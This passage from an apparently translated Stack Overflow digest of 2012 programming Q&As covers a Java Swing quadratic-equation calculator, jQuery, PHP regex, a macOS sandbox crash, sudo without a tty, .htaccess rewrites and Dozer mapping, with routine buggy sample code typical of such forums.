        a_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        a_Label.setForeground(new java.awt.Color(25, 22, 200));
        a_Label.setText("\" a \" :");

        b_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        b_Label.setForeground(new java.awt.Color(25, 22, 200));
        b_Label.setText("\" b \" :");

        c_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        c_Label.setForeground(new java.awt.Color(25, 22, 200));
        c_Label.setText("\" c \" :");

        a_Value.setText("1");

        b_Value.setText("2");

        c_Value.setText("1");

        calc_Button.setText("Calculate Roots!");
        calc_Button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CalculateRoots(evt);
            }
        });

        ResultLabel.setFont(new java.awt.Font("Lucida Fax", 1, 14)); // NOI18N
        ResultLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);

        Root1_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        Root1_Label.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);

        Root2_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        Root2_Label.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);

        javax.swing.GroupLayout MainPanelLayout = new javax.swing.GroupLayout(MainPanel);
        MainPanel.setLayout(MainPanelLayout);
        MainPanelLayout.setHorizontalGroup(
            MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, MainPanelLayout.createSequentialGroup()
                .addGroup(MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, MainPanelLayout.createSequentialGroup()
                        .addGap(149, 149, 149)
                        .addGroup(MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(b_Label)
                            .addComponent(a_Label, javax.swing.GroupLayout.PREFERRED_SIZE, 60, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(c_Label))
                        .addGap(18, 18, 18)
                        .addGroup(MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(c_Value)
                            .addComponent(b_Value)
                            .addComponent(a_Value, javax.swing.GroupLayout.DEFAULT_SIZE, 135, Short.MAX_VALUE))
                        .addGap(69, 69, 69))
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, MainPanelLayout.createSequentialGroup()
                        .addGap(41, 41, 41)
                        .addGroup(MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(ResultLabel, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 412, Short.MAX_VALUE)
                            .addComponent(SubHeaderLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 222, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(Root2_Label, javax.swing.GroupLayout.DEFAULT_SIZE, 412, Short.MAX_VALUE)
                            .addComponent(Root1_Label, javax.swing.GroupLayout.DEFAULT_SIZE, 412, Short.MAX_VALUE))))
                .addContainerGap())
            .addGroup(MainPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(HeaderLabel, javax.swing.GroupLayout.DEFAULT_SIZE, 412, Short.MAX_VALUE)
                .addGap(41, 41, 41))
            .addGroup(MainPanelLayout.createSequentialGroup()
                .addGap(167, 167, 167)
                .addComponent(AuthorLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 112, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(184, Short.MAX_VALUE))
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, MainPanelLayout.createSequentialGroup()
                .addContainerGap(176, Short.MAX_VALUE)
                .addComponent(calc_Button, javax.swing.GroupLayout.PREFERRED_SIZE, 139, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(148, 148, 148))
        );
        MainPanelLayout.setVerticalGroup(
            MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(MainPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(HeaderLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(AuthorLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 27, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addComponent(SubHeaderLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addGroup(MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(a_Value, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(a_Label))
                .addGap(11, 11, 11)
                .addGroup(MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(b_Value, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(b_Label))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(MainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(c_Value, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(c_Label))
                .addGap(18, 18, 18)
                .addComponent(calc_Button)
                .addGap(33, 33, 33)
                .addComponent(ResultLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 28, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(Root1_Label, javax.swing.GroupLayout.PREFERRED_SIZE, 23, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(Root2_Label, javax.swing.GroupLayout.PREFERRED_SIZE, 22, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(MainPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(MainPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

private void CalculateRoots(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_CalculateRoots

    double a = (double)(Double.parseDouble(a_Value.getText()));
    double b = (double)(Double.parseDouble(b_Value.getText()));
    double c = (double)(Double.parseDouble(c_Value.getText()));
    double D = 0.0;
    double r1 = 0.0;
    double r2 = 0.0;

    if (a == 0)
    {
        ResultLabel.setText("Error: The value of \"a\" cannot be zero.");
        Root1_Label.setText("");
        Root2_Label.setText("");
    }
    else
    {
        D = (b * b) - 4 * a * c;
        if (D < 0)
        {
            ResultLabel.setText("Error: The value of \"D\" is less than zero.");
            Root1_Label.setText("Therefore, Real roots do not exist.");
            Root2_Label.setText("");
        }
        else
        {
            r1 = ( - b + Math.sqrt(D) ) / 2 * a;
            r2 = ( - b - Math.sqrt(D) ) / 2 * a;
            ResultLabel.setText("The value of \"D\" is " + D + "");
            Root1_Label.setText("The first root is " + r1 + "");
            Root2_Label.setText("The second root is " + r2 + "");
        }
    }
}//GEN-LAST:event_CalculateRoots

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(QuadraticEquations.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(QuadraticEquations.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(QuadraticEquations.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(QuadraticEquations.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {

            public void run() {
                new QuadraticEquations().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel AuthorLabel;
    private javax.swing.JLabel HeaderLabel;
    private javax.swing.JPanel MainPanel;
    private javax.swing.JLabel ResultLabel;
    private javax.swing.JLabel Root1_Label;
    private javax.swing.JLabel Root2_Label;
    private javax.swing.JLabel SubHeaderLabel;
    private javax.swing.JLabel a_Label;
    private javax.swing.JTextField a_Value;
    private javax.swing.JLabel b_Label;
    private javax.swing.JTextField b_Value;
    private javax.swing.JLabel c_Label;
    private javax.swing.JTextField c_Value;
    private javax.swing.JButton calc_Button;
    // End of variables declaration//GEN-END:variables
} 
```

我安装了 JVM，并将其编译为一个简单的 JAR 可执行文件。其指定的主要类是`QuadraticEquations`. 在 Windows 中执行和运行良好，但在 Linux 中却不行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T16:32:14.727

您的示例同时在 Mac OS X/AppleJDK 和 Ubuntu/OpenJDK 上运行。作为参考，`GroupLayout`它是在 Java 6 中引入的，因此您可以检查您安装的版本。

作为初学者，你可以暂时放下 GUI 编辑器，尝试更简单的[布局](http://docs.oracle.com/javase/tutorial/uiswing/layout/visual.html)，如下`GridLayout`图所示。作为练习，使用嵌套`JPanel`的必须`Flowlayout`将标签和输入字段保持在同一行。

对于未来的学习，您可能还会喜欢这种寻找[多项式根](https://sites.google.com/site/drjohnbmatthews/polyroots)的替代方法。

附录：我添加了一个使用 Ubuntu 10/OpenJDK 的屏幕截图。

![在此处输入图像描述](../Images/ebda8b026fb73b97e03f1d35163c650f.png)

```
public class QuadraticEquations extends javax.swing.JFrame {

    /**
    * Creates new form QuadraticEquations
    */
    public QuadraticEquations() {
        initComponents();
    }

    private void initComponents() {
        mainPanel = new javax.swing.JPanel();
        headerLabel = new javax.swing.JLabel();
        authorLabel = new javax.swing.JLabel();
        subHeaderLabel = new javax.swing.JLabel();
        a_Label = new javax.swing.JLabel();
        b_Label = new javax.swing.JLabel();
        c_Label = new javax.swing.JLabel();
        a_Value = new javax.swing.JTextField();
        b_Value = new javax.swing.JTextField();
        c_Value = new javax.swing.JTextField();
        calc_Button = new javax.swing.JButton();
        resultLabel = new javax.swing.JLabel();
        root1_Label = new javax.swing.JLabel();
        root2_Label = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Quadratic Equations Roots Calculator");

        headerLabel.setFont(new java.awt.Font("Lucida Fax", 1, 18)); // NOI18N
        headerLabel.setForeground(new java.awt.Color(0, 0, 255));
        headerLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        headerLabel.setText("Quadratic Equations - Roots Calculator");

        authorLabel.setFont(new java.awt.Font("Lucida Fax", 1, 14)); // NOI18N
        authorLabel.setForeground(new java.awt.Color(0, 165, 0));
        authorLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        authorLabel.setText("Afaan Bilal");

        subHeaderLabel.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        subHeaderLabel.setText("Enter the values of 'a', 'b', 'c' : ");

        a_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        a_Label.setForeground(new java.awt.Color(25, 22, 200));
        a_Label.setText("\" a \" :");

        b_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        b_Label.setForeground(new java.awt.Color(25, 22, 200));
        b_Label.setText("\" b \" :");

        c_Label.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        c_Label.setForeground(new java.awt.Color(25, 22, 200));
        c_Label.setText("\" c \" :");

        a_Value.setText("1");
        b_Value.setText("2");
        c_Value.setText("1");

        calc_Button.setText("Calculate Roots!");
        calc_Button.addActionListener(new java.awt.event.ActionListener() {

            @Override
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CalculateRoots(evt);
            }
        });

        resultLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        root1_Label.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        root2_Label.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);

        mainPanel.setLayout(new java.awt.GridLayout(0,1));
        mainPanel.add(headerLabel);
        mainPanel.add(authorLabel);
        mainPanel.add(subHeaderLabel);
        mainPanel.add(a_Label);
        mainPanel.add(a_Value);
        mainPanel.add(b_Label);
        mainPanel.add(b_Value);
        mainPanel.add(c_Label);
        mainPanel.add(c_Value);
        mainPanel.add(calc_Button);
        mainPanel.add(resultLabel);
        mainPanel.add(root1_Label);
        mainPanel.add(root2_Label);

        add(mainPanel);
        pack();
        setLocationRelativeTo(null);
    }

    private void CalculateRoots(java.awt.event.ActionEvent evt) {

        double a = Double.parseDouble(a_Value.getText());
        double b = Double.parseDouble(b_Value.getText());
        double c = Double.parseDouble(c_Value.getText());
        double d = 0.0;
        double r1 = 0.0;
        double r2 = 0.0;

        if (a == 0) {
            resultLabel.setText("Error: The value of \"a\" cannot be zero.");
            root1_Label.setText("");
            root2_Label.setText("");
        } else {
            d = (b * b) - 4 * a * c;
            if (d < 0) {
                resultLabel.setText("Error: The value of \"D\" is negative.");
                root1_Label.setText("Therefore, Real roots do not exist.");
                root2_Label.setText("");
            } else {
                r1 = (-b + Math.sqrt(d)) / 2 * a;
                r2 = (-b - Math.sqrt(d)) / 2 * a;
                resultLabel.setText("The value of \"D\" is " + d);
                root1_Label.setText("The first root is " + r1);
                root2_Label.setText("The second root is " + r2);
            }
        }
    }

    /**
    * @param args the command line arguments
    */
    public static void main(String args[]) {
        /*
        * Create and display the form
        */
        java.awt.EventQueue.invokeLater(new Runnable() {

            @Override
            public void run() {
                new QuadraticEquations().setVisible(true);
            }
        });
    }
    // Variables declaration
    private javax.swing.JLabel authorLabel;
    private javax.swing.JLabel headerLabel;
    private javax.swing.JPanel mainPanel;
    private javax.swing.JLabel resultLabel;
    private javax.swing.JLabel root1_Label;
    private javax.swing.JLabel root2_Label;
    private javax.swing.JLabel subHeaderLabel;
    private javax.swing.JLabel a_Label;
    private javax.swing.JTextField a_Value;
    private javax.swing.JLabel b_Label;
    private javax.swing.JTextField b_Value;
    private javax.swing.JLabel c_Label;
    private javax.swing.JTextField c_Value;
    private javax.swing.JButton calc_Button;
    // End of variables declaration
} 
```

# jquery - 如何创建包含结构化文本的 HTML 表单

> ID：10862704
> 
> 赞同：0
> 
> 时间：2012-06-02T13:34:34.790
> 
> 标签：jquery, html, forms, twitter-bootstrap

使用 Twitter Bootstrap，我有一个如下所示的表单：

```
Name         Country         Phone Number
-----------------------------------------
John         USA
Joe          Canada 
```

上表中的所有这些值都将是文本字段、下拉列表等。

有没有一种方法可以创建一个包含在 div 中的表单，当提交时，表的所有值都被逐个提交？

```
<div class="row-fluid">
    <div class="span12">
        Level 1 of column
        <div class="row-fluid">
            <div class="span6">Level 2</div>
            <div class="span6">Level 2</div>
        </div>
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:12:06.377

```
<form ...>
  <table>
    <thead><tr> <th>Name <th>Country <th>Phone number
    <tbody>
      <tr> <td>John <td>USA
      <tr> <td>Joe <td>Canada
    ...
  </table>
</form> 
```

当您有数据表时，请使用`table`元素，而不是`div`元素沙拉。只需将表格放入`form`元素中即可。如果所有字段都在`form`元素内部，则所有字段都将在表单中提交，而与中间的表（或其他）标记无关。

不清楚`div`标记是如何与问题相关的，特别是因为类名不反映含义。

# javascript - 在 jQuery 中将对象传递给 .attr()

> ID：10862705
> 
> 赞同：2
> 
> 时间：2012-06-02T13:34:49.847
> 
> 标签：javascript, jquery, object

我正在尝试将对象文字传递给 jQuery 中的 .attr() 方法以自动创建 DOM 元素。问题是当有多个属性要设置时，它会失败。

```
var atts = {'type':'text', 'id':'#inputBox'};
createElem('<input></input>', '#divToAppendTo', atts);

function createElem(typeOfField, fldToAppendTo, atts){
    // this works when there is only one attribute to set, but fails when there is more than 1
    jQuery(typeOfField, atts).appendTo(fldToAppendTo);
} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:48:54.457

摆脱您的代码并改用它：

```
$( "<input>", {type:'text', id:'inputBox'} ).appendTo("#divAppendTo") 
```

[http://jsfiddle.net/j8cXF/](http://jsfiddle.net/j8cXF/)

请注意，对于 jQuery 构造函数，以下所有内容都是等效的并触发`document.createElement`优化路径：

```
"<input></input>"
"<input/></input>"
"<input/>"
"<input>"
 // Plus infinite different combinations of whitespace 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:46:26.187

您在线程标题中提到`attr()`了方法，但没有使用它

尝试：

```
 function createElem(typeOfField, fldToAppendTo, atts){
     // this works when there is only one attribute to set, but fails when there is more than 1
     jQuery(typeOfField).attr( atts).appendTo(fldToAppendTo);
} 
```

# php - 如何在 PHP 中删除字符串的单词（数量有限）

> ID：10862708
> 
> 赞同：0
> 
> 时间：2012-06-02T13:35:36.970
> 
> 标签：php, string

问：如何在 PHP 中删除字符串中的单词（计数限制为 3 个字符）

示例字符串：“删除 3 个字母的所有单词” 预期字符串：“删除单词字母”

基本上，删除所有小于等于 3 个计数的单词。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T13:38:19.747

选择长度在 1 到 3 之间的单词的正则表达式：

```
preg_replace('/\b\w{1,3}\b\s*/', '', $sentence); 
```

是`\b`匹配一个单词边界，`\w`表示一个“单词”字符。最后`\s*`的 确保多余的空间也被删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:51:55.980

使用边界一词：

```
preg_replace('/\b(?:^|\s\w{1,3})\b/', '', $sentance); 
```

杰克的回答只匹配了所有的和的。

此表达式查找单词边界并将在其上匹配。

# objective-c - 首次启动沙盒应用程序时崩溃

> ID：10862709
> 
> 赞同：3
> 
> 时间：2012-06-02T13:35:47.303
> 
> 标签：objective-c, macos, cocoa, appstore-sandbox

我刚刚更改了沙盒应用程序的包标识符，然后运行了它。我什至在运行之前就遇到了运行时异常`main()`。堆栈跟踪的顶部是`runtime_init`. 我尝试在 Xcode 之外运行该应用程序并获得标准的崩溃报告对话框。滚动浏览提供的信息，我注意到：

```
Application Specific Information:
dyld: launch, running initializers
/usr/lib/libSystem.B.dylib
xpchelper reply message validation: sandbox creation failed: 1002
Container object initialization failed: The operation couldn’t be completed. (Cocoa error 13.) 
```

我再跑一次就没有问题了。我看到容器存在。但是，一旦我删除容器，异常就会再次抛出。我不希望我的用户对我的应用程序的第一次体验是崩溃的。我怎样才能解决这个问题？

我尝试修复权限，这没有任何区别。我还注意到，当 Xcode 因异常中断时，容器已经创建。此外，Craig Hockenberry 在一篇[博](http://furbo.org/2012/01/23/sandboxing/)文中提到了这个错误，但他归咎于用户主目录中的符号链接。我那里没有任何符号链接（至少不在顶层，这是我认为他的意思）。

[Twitter 上](https://twitter.com/jgreenfield/status/208954966482755584)的其他输入表明它可以是符号链接*任何地方*的符号链接，在这种情况下，我肯定有一些。有没有人发现它的解决方法？我想这会很困难，因为在异常之前没有执行任何应用程序代码。希望山狮能解决它...？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T19:03:21.167

最后通过从桌面、文档、下载、电影和图片用户目录中删除所有内容来解决此崩溃。我认为它与其他线程中提到的符号链接问题有关。

# inheritance - 玉继承与条件

> ID：10862710
> 
> 赞同：0
> 
> 时间：2012-06-02T13:35:49.403
> 
> 标签：inheritance, pug, conditional

使用玉的继承而不是使用条件和包含更好吗？

问题是通过使用继承，玉可以像没有逻辑一样使用（像胡子一样）对吧？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-10T17:57:36.510

您应该使用继承来处理强差异，例如您网站的不同页面。

您应该将条件用于特定的小事情，例如“用户已登录？显示名称 || 显示登录页面的链接

# python - PIL 裁剪图像返回一个有趣的 PIL.Image._ImageCrop 数据类型

> ID：10862713
> 
> 赞同：0
> 
> 时间：2012-06-02T13:36:20.930
> 
> 标签：python, python-imaging-library

当`cropped_image = image.crop( cords )`工作正常时，它返回一个`Image`与 Scipy's 一起工作的对象`assaray`：

```
bitmap <PIL.Image.Image image mode=RGBA size=1600x1200 at 0xAC9CFEC>
#SCIPY'S ASARRAY WORKS PROPERLY!
pic!! [[[ 16  18  31 255]
  [ 16  18  31 255]
  [ 16  18  31 255]
  ..., 
```

但现在我得到一个`PIL.Image._ImageCrop`失败的对象。

```
bitmap <PIL.Image._ImageCrop image mode=RGBA size=1600x80 at 0x99635AC>
#SCIPY'S ASARRAY FAILS WITHOUT WARNING
pic!! <PIL.Image._ImageCrop image mode=RGBA size=1600x80 at 0x99635AC>
Traceback (most recent call last):
  File "/root/dev/spectrum/final/image_handler.py", line 216, in on_left_down
    self._sample_callback()
  File "/root/dev/spectrum/final/image_handler.py", line 237, in _sample_callback
    self.__callback_function( sample )
  File "/root/dev/spectrum/final/plot_handler.py", line 117, in __init__
    self.InitUI()
  File "/root/dev/spectrum/final/plot_handler.py", line 163, in InitUI
    self.canvas_panel.draw(self.__crop_section)
  File "/root/dev/spectrum/final/plot_handler.py", line 78, in draw
    pic_avg     = pic.mean(axis=2)
ValueError: axis(=2) out of bounds 
```

为什么会出现这样的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T16:53:23.787

这是一种无声的失败，源于两种情况：

首先，crop 方法提供了**非整数**。

其次，[裁剪操作恰好是一个惰性操作](https://stackoverflow.com/a/3838495/604511)，只有在`.load()`调用方法时才会裁剪（这个我不清楚，如果你知道的请编辑这个！）。

因此，作物作业**没有发生**，也没有发出明显的信号。给它有效的坐标解决了这个问题。

# linux - 如何从终端打开 xterm 窗口并从 xterm 在后台运行命令？

> ID：10862715
> 
> 赞同：3
> 
> 时间：2012-06-02T13:36:43.177
> 
> 标签：linux, shell, command-line, xterm, gnome-terminal

我的应用程序尝试执行根命令“sudo ifup eth0”和“ *sudo ifdown eth0”。但它返回了一个错误“sudo：对不起，你必须有一个 tty 才能运行 sudo* ”。因此，它需要一个 tty 来执行 sudo 命令。所以，我尝试通过打开 tty 会话来执行命令

```
gnome-terminal --command="sudo ifdown eth0" &
xterm -e "sudo ifdown eth0" & 
```

然后它工作正常。但我无法从新创建的 gnome-terminal 或 xterm 发送命令。即，如果我在新创建的 gnome 或 xterm 窗口执行命令之前关闭它们，那么命令会立即终止。

您能否建议如何**禁止用户关闭窗口**或如何使其对用户不可见？

注意：您可以使用**system-config-network**命令而不是 ifdown 和 ifup来测试它

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T13:50:35.347

我建议不要使用 xterm 或 gnome-terminal 为 sudo 提供终端，而是直接处理*“对不起，您必须有一个 tty 才能运行 sudo”*消息。

文件中有一个`requiretty`选项`sudoers`使 sudo 要求终端。如果未设置此选项`!requiretty`并且使用 NOPASSWD 选项执行命令，则 sudo 应该运行而无需打开新的终端窗口。[此服务器故障帖子](https://serverfault.com/questions/315150/no-tty-present-when-running-commands-over-ssh-in-here-document)中有更多详细信息。

这就是 sudo 在 cron 脚本中的使用方式。

由于 requiretty 选项在 sudo 不仅用于 cron 脚本而且让远程用户以提升的权限发出命令的环境中提供了额外的安全性，因此可以限制 !requiretty 的操作。

```
 User_Alias LOCAL_USERS = john, mary
   Cmnd_Alias NETWORK_SCRIPTS = /sbin/ifup, /sbin/ifdown
   Defaults!NETWORK_SCRIPTS     !requiretty
   LOCAL_USERS ALL = NOPASSWD: NETWORK_SCRIPTS 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T15:19:10.253

如果您在 X 会话中运行您的代码，那么您可以使用`gksudo`而不是`sudo`：

```
gksudo -m "Your message" /command/to/run 
```

它将使用漂亮的 GUI 界面提示用户输入密码（如果需要）。无需 xterm 或 gnome-terminal。

效果将比允许特定命令在没有任何密码的情况下运行更安全，并且解决方案将更符合用户的习惯。

![在此处输入图像描述](../Images/e553a897dddf1161438d9f94f0657bdf.png)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T14:55:50.707

通常，sudo 或 su 需要提示输入密码，否则程序可以在没有用户干预的情况下提升其权限。如果您的应用程序出于某种目的需要提升，您将需要使用 xterm 或类似的。尽管在取回返回码方面存在困难（konsole 可能需要`--nofork`，gnome-terminal 可能需要`--disable-factory`，但选项因版本而异），而且在每个系统上都很难做到这一点。大多数 unix 和 linux 发行版都提供 xterm，但一些旧的 Fedora/RHEL/CentOS 提供没有 xterm 的 X，所以这是另一个需要考虑的依赖项。

由启动的命令`xterm -e sudo -- ...`然后可以执行标准的双叉和setsid。一旦用户在 xterm 中输入了他的密码，它就会立即消失，但您的命令会在后台以提升的权限运行。它可以使用套接字或 fifo 连接回原始程序，以作为根协同进程运行。

如果您想将现有应用程序包装在双叉和 setsid 中​​（例如，或者可能），`daemon`or`disown`命令或类似命令可能很有用。`xterm -e sudo -- daemon system-config-network``xterm -e sudo -- bash -c "system-config-network & disown -a"`

# php - ht 访问问题，带有示例

> ID：10862722
> 
> 赞同：0
> 
> 时间：2012-06-02T13:37:17.630
> 
> 标签：php, .htaccess

我的最终目标是拥有这样的东西。

**127.0.0.1/site/search/search-term**

而不是，

**127.0.0.1/site/search.php?term=**

我尝试了两段代码，首先是。

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ ../search.php?term=$1 
```

我把它放在一个名为 /search 的文件夹中。HTACCESS 完美运行，但我的网站的 css 搞砸了，它只是将所有内容显示为纯文本，没有任何样式。

其次我试过

```
RewriteEngine On
RewriteBase /search/
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ ../search.php?term=$1 
```

并将其放在 127.0.0.1/site/root 中。但是当我尝试 127.0.0.1/site/search/searchterm 时，我得到了 404。

谁能看到我哪里出错了？我猜第一个选项是修复的最佳选项，因为它是如此接近，我查看了使用虚荣网址后收到的页面的来源，我认为这可能与我如何链接有关样式表？如果我为链接输入完整地址（127.0.0.1/site/main.css），它会起作用，但是在我所有的 jquery 包括等上它都失败了。当我想输入完整地址时是否明智？使用虚荣网址？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:35:37.523

首先确保您在 CSS、JS 和图像文件中使用绝对路径。这意味着这些资源的路径应该以斜杠`/`或`http://`. 如果您还没有它，请进行必要的代码更改。完成后使用以下 .htaccess in `$DOCUMENT_ROOT`( **not in`$DOCUMENT_ROOT/site`** )：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-l
RewriteRule ^site/search/(.+)/?$ site/search.php?term=$1 [L,QSA,NC] 
```

**编辑：**根据您的评论，这里是制作小写 URI 的代码：

首先在 httpd.conf 文件末尾的 OR 部分添加这一行：

```
RewriteMap lc int:tolower 
```

然后有这样的规则：

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-l
RewriteRule ^site/search/(.+)/?$ site/search.php?term=${lc:$1] [L,QSA,NC] 
```

# java - 仅将字符串属性从一个对象复制到另一个对象

> ID：10862726
> 
> 赞同：0
> 
> 时间：2012-06-02T13:37:51.737
> 
> 标签：java, dozer, modelmapper

我正在使用推土机，我有一个我认为推土机不支持的特殊场景。假设我有一个具有不同类型属性的类，如 String、Ingeger 和其他原始类型。现在我只想将字符串属性从这个类复制到另一个。这是一个示例代码：（它非常简短，但可以正确理解问题。）

```
Class Source{
private int a;
private boolean b;
private String s1;
//more properties with primitive type.

}
Class Destination{
//    same structure
} 
```

现在我想要一些像，

```
DozerBeanMapper mapper = new DozerBeanMapper();
//    initialize Object of source
//   initialize Object of destination
mapper.map(source,destination); 
```

